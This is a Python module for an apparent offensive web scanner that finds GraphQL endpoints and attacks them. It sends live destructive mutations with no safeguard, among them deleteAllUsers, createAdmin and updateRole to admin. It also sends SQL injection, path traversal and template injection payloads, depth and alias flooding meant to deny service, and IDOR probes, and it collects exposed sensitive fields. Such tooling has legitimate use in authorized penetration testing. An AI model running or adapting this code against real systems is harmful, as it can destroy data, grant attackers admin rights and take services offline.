import re
import json
import asyncio
from typing import Dict, List, Set, Optional, Tuple
from urllib.parse import urljoin
from modules.base import BaseModule
from core.http import get_base_url


class GraphqlModule(BaseModule):
    name = "graphql"
    description = "GraphQL Security Scanner"
    exploitable = True
    
    common_endpoints = [
        "/graphql", "/graphql/", "/api/graphql", "/api/graphql/",
        "/v1/graphql", "/v2/graphql", "/query", "/gql",
        "/graphiql", "/playground", "/console", "/api", "/api/v1",
        "/altair", "/voyager", "/graphql-explorer",
    ]
    
    introspection_query = '''
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          name
          kind
          description
          fields(includeDeprecated: true) {
            name
            description
            args { name type { name kind } }
            type { name kind ofType { name kind } }
          }
        }
        directives { name description locations args { name } }
      }
    }
    '''
    
    sensitive_field_patterns = [
        r"password", r"secret", r"token", r"key", r"credential",
        r"auth", r"admin", r"private", r"internal", r"ssn",
        r"credit", r"card", r"bank", r"account", r"balance",
    ]
    
    async def scan(self, target: str):
        self.findings = []
        self.schema: Optional[Dict] = None
        self.endpoint: Optional[str] = None
        self.mutations: List[str] = []
        self.queries: List[str] = []
        self.sensitive_fields: Set[str] = set()
        
        base_url = get_base_url(target)
        
        self.endpoint = await self._find_graphql_endpoint(base_url)
        
        if self.endpoint:
            self.schema = await self._test_introspection(self.endpoint)
            
            if self.schema:
                await self._analyze_schema(self.schema)
            
            await self._test_field_suggestions(self.endpoint)
            await self._test_batching_attacks(self.endpoint)
            await self._test_depth_attack(self.endpoint)
            await self._test_alias_dos(self.endpoint)
            await self._test_mutation_permissions(self.endpoint)
            await self._test_subscription_abuse(self.endpoint)
            await self._test_injection(self.endpoint)
            await self._test_idor(self.endpoint)
        
        return self.findings
    
    async def _find_graphql_endpoint(self, base_url: str) -> Optional[str]:
        for endpoint in self.common_endpoints:
            url = urljoin(base_url, endpoint)
            
            resp = await self.http.post(
                url,
                json={"query": "{ __typename }"},
                headers={"Content-Type": "application/json"}
            )
            
            if resp.get("status") == 200:
                try:
                    data = json.loads(resp.get("text", ""))
                    if "data" in data or "errors" in data:
                        self.add_finding(
                            "INFO",
                            f"GraphQL endpoint found",
                            url=url,
                            evidence=f"Endpoint: {endpoint}"
                        )
                        return url
                except json.JSONDecodeError:
                    pass
            
            resp = await self.http.get(f"{url}?query={{__typename}}")
            if resp.get("status") == 200:
                try:
                    data = json.loads(resp.get("text", ""))
                    if "data" in data or "errors" in data:
                        return url
                except json.JSONDecodeError:
                    pass
        
        return None
    
    async def _test_introspection(self, endpoint: str) -> Optional[Dict]:
        resp = await self.http.post(
            endpoint,
            json={"query": self.introspection_query},
            headers={"Content-Type": "application/json"}
        )
        
        if resp.get("status") == 200:
            try:
                data = json.loads(resp.get("text", ""))
                if "data" in data and data["data"].get("__schema"):
                    schema = data["data"]["__schema"]
                    types = schema.get("types", [])
                    
                    self.add_finding(
                        "HIGH",
                        f"GraphQL introspection enabled",
                        url=endpoint,
                        evidence=f"Found {len(types)} types exposed"
                    )
                    
                    self.record_success("introspection", endpoint)
                    return schema
            except json.JSONDecodeError:
                pass
        
        return None
    
    async def _analyze_schema(self, schema: Dict):
        types = schema.get("types", [])
        
        for type_def in types:
            type_name = type_def.get("name", "")
            
            if type_name.startswith("__"):
                continue
            
            fields = type_def.get("fields") or []
            for field in fields:
                field_name = field.get("name", "").lower()
                
                for pattern in self.sensitive_field_patterns:
                    if re.search(pattern, field_name, re.IGNORECASE):
                        self.sensitive_fields.add(f"{type_name}.{field['name']}")
        
        if self.sensitive_fields:
            self.add_finding(
                "HIGH",
                f"Sensitive fields exposed in schema",
                url=self.endpoint,
                evidence=f"Fields: {', '.join(list(self.sensitive_fields)[:10])}"
            )
        
        mutation_type = schema.get("mutationType")
        if mutation_type:
            for type_def in types:
                if type_def.get("name") == mutation_type.get("name"):
                    for field in type_def.get("fields") or []:
                        self.mutations.append(field.get("name"))
        
        query_type = schema.get("queryType")
        if query_type:
            for type_def in types:
                if type_def.get("name") == query_type.get("name"):
                    for field in type_def.get("fields") or []:
                        self.queries.append(field.get("name"))
    
    async def _test_field_suggestions(self, endpoint: str):
        typo_queries = [
            '{ usre { id } }',
            '{ pasword }',
            '{ admni { role } }',
            '{ usr { email } }',
        ]
        
        for query in typo_queries:
            resp = await self.http.post(
                endpoint,
                json={"query": query},
                headers={"Content-Type": "application/json"}
            )
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                if "did you mean" in text.lower() or "suggestion" in text.lower():
                    suggestions = re.findall(r'["\'](\w+)["\']', text)
                    
                    self.add_finding(
                        "MEDIUM",
                        "GraphQL field suggestions enabled",
                        url=endpoint,
                        evidence=f"Suggestions: {suggestions[:5]}"
                    )
                    break
    
    async def _test_batching_attacks(self, endpoint: str):
        batch_sizes = [10, 50, 100]
        
        for size in batch_sizes:
            batch = [{"query": "{ __typename }"} for _ in range(size)]
            
            resp = await self.http.post(
                endpoint,
                json=batch,
                headers={"Content-Type": "application/json"}
            )
            
            if resp.get("status") == 200:
                try:
                    data = json.loads(resp.get("text", ""))
                    if isinstance(data, list) and len(data) >= size:
                        self.add_finding(
                            "HIGH",
                            f"GraphQL batch query attack possible ({size} queries)",
                            url=endpoint,
                            evidence="Can brute force auth/tokens via batching"
                        )
                        
                        self.record_success(f"batch:{size}", endpoint)
                        
                        if size >= 50:
                            break
                except json.JSONDecodeError:
                    pass
    
    async def _test_depth_attack(self, endpoint: str):
        depths = [5, 10, 20, 50]
        
        for depth in depths:
            nested = "{ __typename " + "{ __typename " * depth + "}" * depth + "}"
            
            resp = await self.http.post(
                endpoint,
                json={"query": nested},
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if resp.get("status") == 200:
                if depth >= 20:
                    self.add_finding(
                        "HIGH",
                        f"GraphQL depth attack possible (depth={depth})",
                        url=endpoint,
                        evidence="No query depth limiting - DoS risk"
                    )
                    break
            elif resp.get("status") == 400:
                break
    
    async def _test_alias_dos(self, endpoint: str):
        alias_counts = [100, 500, 1000]
        
        for count in alias_counts:
            aliases = " ".join([f"a{i}: __typename" for i in range(count)])
            query = f"query {{ {aliases} }}"
            
            try:
                resp = await self.http.post(
                    endpoint,
                    json={"query": query},
                    headers={"Content-Type": "application/json"},
                    timeout=15
                )
                
                if resp.get("status") == 200:
                    data = json.loads(resp.get("text", ""))
                    if "data" in data and len(data.get("data", {})) >= count // 2:
                        self.add_finding(
                            "HIGH",
                            f"GraphQL alias DoS possible ({count} aliases)",
                            url=endpoint,
                            evidence="Rate limit bypass via aliases"
                        )
                        
                        if count >= 500:
                            break
            except (asyncio.TimeoutError, json.JSONDecodeError):
                break
    
    async def _test_mutation_permissions(self, endpoint: str):
        dangerous_mutations: List[Tuple[str, str]] = [
            ('mutation { deleteUser(id: "1") }', "deleteUser"),
            ('mutation { updateRole(userId: "1", role: "admin") }', "updateRole"),
            ('mutation { resetPassword(email: "test@test.com") }', "resetPassword"),
            ('mutation { createAdmin(username: "hacker") }', "createAdmin"),
            ('mutation { deleteAllUsers }', "deleteAllUsers"),
            ('mutation { updateSettings(debug: true) }', "updateSettings"),
        ]
        
        for mutation, name in dangerous_mutations:
            resp = await self.http.post(
                endpoint,
                json={"query": mutation},
                headers={"Content-Type": "application/json"}
            )
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                if "error" not in text.lower() and "unauthorized" not in text.lower():
                    try:
                        data = json.loads(text)
                        if data.get("data") and not data.get("errors"):
                            self.add_finding(
                                "CRITICAL",
                                f"Unauthorized mutation: {name}",
                                url=endpoint,
                                evidence="Mutation executed without proper auth"
                            )
                            self.record_success(mutation, endpoint)
                    except json.JSONDecodeError:
                        pass
    
    async def _test_subscription_abuse(self, endpoint: str):
        sub_query = '''
        subscription {
            onUserCreated { id email password }
        }
        '''
        
        resp = await self.http.post(
            endpoint,
            json={"query": sub_query},
            headers={"Content-Type": "application/json"}
        )
        
        if resp.get("status") == 200:
            text = resp.get("text", "")
            
            if "subscriptions" in text.lower() or "websocket" in text.lower():
                self.add_finding(
                    "MEDIUM",
                    "GraphQL subscriptions available",
                    url=endpoint,
                    evidence="May leak real-time data"
                )
    
    async def _test_injection(self, endpoint: str):
        injection_payloads: List[Tuple[str, str]] = [
            ('{ user(id: "1\' OR \'1\'=\'1") { id } }', "SQLi"),
            ('{ user(id: "1; DROP TABLE users--") { id } }', "SQLi"),
            ('{ user(id: "../../../etc/passwd") { id } }', "LFI"),
            ('{ user(id: "{{7*7}}") { id } }', "SSTI"),
            ('{ user(id: "${7*7}") { id } }', "SSTI"),
            ('{ user(where: {id: {_eq: "admin"}}) { password } }', "Hasura"),
        ]
        
        for payload, vuln_type in injection_payloads:
            resp = await self.http.post(
                endpoint,
                json={"query": payload},
                headers={"Content-Type": "application/json"}
            )
            
            if resp.get("status") == 200:
                text = resp.get("text", "").lower()
                
                indicators = {
                    "SQLi": ["sql", "syntax", "mysql", "postgresql", "sqlite"],
                    "LFI": ["root:", "passwd", "no such file"],
                    "SSTI": ["49", "jinja", "template"],
                    "Hasura": ["hasura", "constraint"],
                }
                
                for pattern in indicators.get(vuln_type, []):
                    if pattern in text:
                        self.add_finding(
                            "CRITICAL",
                            f"{vuln_type} in GraphQL",
                            url=endpoint,
                            evidence=f"Pattern: {pattern}"
                        )
                        self.record_success(payload, endpoint)
                        break
    
    async def _test_idor(self, endpoint: str):
        if not self.queries:
            return
        
        for query_name in self.queries[:5]:
            for test_id in ["1", "0", "-1", "admin", "null"]:
                query = f'{{ {query_name}(id: "{test_id}") {{ id }} }}'
                
                resp = await self.http.post(
                    endpoint,
                    json={"query": query},
                    headers={"Content-Type": "application/json"}
                )
                
                if resp.get("status") == 200:
                    try:
                        data = json.loads(resp.get("text", ""))
                        if data.get("data", {}).get(query_name):
                            self.add_finding(
                                "MEDIUM",
                                f"Potential IDOR: {query_name}",
                                url=endpoint,
                                evidence=f"Accessed with id={test_id}"
                            )
                            break
                    except json.JSONDecodeError:
                        pass
    
    async def exploit(self, target: str, finding: Dict):
        results = {
            "extracted_schema": self.schema,
            "sensitive_fields": list(self.sensitive_fields),
            "mutations": self.mutations,
            "queries": self.queries,
        }
        
        if self.schema:
            self.add_exploit_data("graphql_schema", self.schema)
        
        if self.sensitive_fields:
            self.add_exploit_data("sensitive_fields", list(self.sensitive_fields))
        
        return results
    
    def get_schema(self) -> Optional[Dict]:
        return self.schema
    
    def get_endpoint(self) -> Optional[str]:
        return self.endpoint
